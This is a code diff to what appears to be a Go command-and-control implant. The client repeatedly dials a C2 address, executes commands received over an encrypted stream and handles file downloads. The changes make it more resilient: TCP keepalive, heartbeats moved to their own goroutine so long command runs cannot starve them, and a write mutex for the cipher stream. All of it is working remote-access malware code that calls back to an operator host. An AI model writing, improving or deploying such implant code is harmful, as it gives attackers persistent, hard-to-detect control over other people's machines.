@@ -20,6 +20,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"sync"
 	"time"
 )
 
@@ -131,8 +132,11 @@ func run(o *options) int {
 	if delay < 1 {
 		delay = 1
 	}
+	// TCP keepalive detects a silently dead peer (half-open connection) instead
+	// of blocking forever on a read.
+	dialer := net.Dialer{Timeout: 15 * time.Second, KeepAlive: 30 * time.Second}
 	for {
-		conn, err := net.DialTimeout("tcp", o.c2Address, 15*time.Second)
+		conn, err := dialer.Dial("tcp", o.c2Address)
 		if err != nil {
 			log.Printf("connect to %s failed: %v; retry in %.0fs", o.c2Address, err, delay)
 			time.Sleep(seconds(delay))
@@ -157,7 +161,13 @@ func run(o *options) int {
 			delay = 1
 		}
 
+		// Heartbeats run on their own goroutine so a long command execution
+		// (which blocks the serve loop) cannot starve them.
+		stopHB := make(chan struct{})
+		go heartbeatLoop(enc, time.Duration(o.heartbeat)*time.Second, stopHB)
+
 		shutdown := serve(enc, pr, o)
+		close(stopHB)
 		_ = enc.Close()
 		if shutdown {
 			log.Printf("shutdown received, exiting")
@@ -166,6 +176,29 @@ func run(o *options) int {
 		log.Printf("connection closed; retry in %.0fs", delay)
 		time.Sleep(seconds(delay))
 		delay = nextDelay(delay, o.reconnectMax)
+	}
+}
+
+// heartbeatLoop sends a heartbeat every interval on its own goroutine,
+// independent of command execution. It stops when stop is closed or a write
+// fails (connection gone).
+func heartbeatLoop(conn net.Conn, interval time.Duration, stop <-chan struct{}) {
+	if interval <= 0 {
+		interval = 30 * time.Second
+	}
+	ticker := time.NewTicker(interval)
+	defer ticker.Stop()
+	var reqID uint64 = 3 // 1=register, 2=register_confirm
+	for {
+		select {
+		case <-stop:
+			return
+		case <-ticker.C:
+			if err := sendHeartbeat(conn, reqID); err != nil {
+				return
+			}
+			reqID++
+		}
 	}
 }
 
@@ -248,11 +281,7 @@ const (
 )
 
 func serve(conn net.Conn, pr *packetReader, o *options) bool {
-	nextReq := uint64(3)
-	lastHB := time.Now()
-	hbInterval := time.Duration(o.heartbeat) * time.Second
 	buf := make([]byte, 4096)
-
 	for {
 		pkt, err := pr.next()
 		if err != nil {
@@ -265,41 +294,13 @@ func serve(conn net.Conn, pr *packetReader, o *options) bool {
 			case stopDisconnect:
 				return false
 			}
-			// Send a due heartbeat even under a steady packet flow, so the C2
-			// watchdog cannot time us out while commands keep arriving.
-			if time.Since(lastHB) >= hbInterval {
-				if err := sendHeartbeat(conn, nextReq); err != nil {
-					return false
-				}
-				nextReq++
-				lastHB = time.Now()
-			}
 			continue
 		}
-
-		wait := hbInterval - time.Since(lastHB)
-		if wait <= 0 {
-			if err := sendHeartbeat(conn, nextReq); err != nil {
-				return false
-			}
-			nextReq++
-			lastHB = time.Now()
-			continue
-		}
-		_ = conn.SetReadDeadline(time.Now().Add(wait))
 		n, rerr := conn.Read(buf)
 		if n > 0 {
 			pr.feed(buf[:n])
 		}
 		if rerr != nil {
-			if ne, ok := rerr.(net.Error); ok && ne.Timeout() {
-				if err := sendHeartbeat(conn, nextReq); err != nil {
-					return false
-				}
-				nextReq++
-				lastHB = time.Now()
-				continue
-			}
 			return false
 		}
 	}
@@ -461,7 +462,14 @@ func handleDownload(conn net.Conn, pkt *packet) {
 	}
 }
 
+// writeMu serializes every write (heartbeats and command responses) so packets
+// never interleave on the encrypted stream, whose cipher state is not
+// concurrency-safe.
+var writeMu sync.Mutex
+
 func send(conn net.Conn, pkt []byte) error {
+	writeMu.Lock()
+	defer writeMu.Unlock()
 	_ = conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
 	_, err := conn.Write(pkt)
 	return err
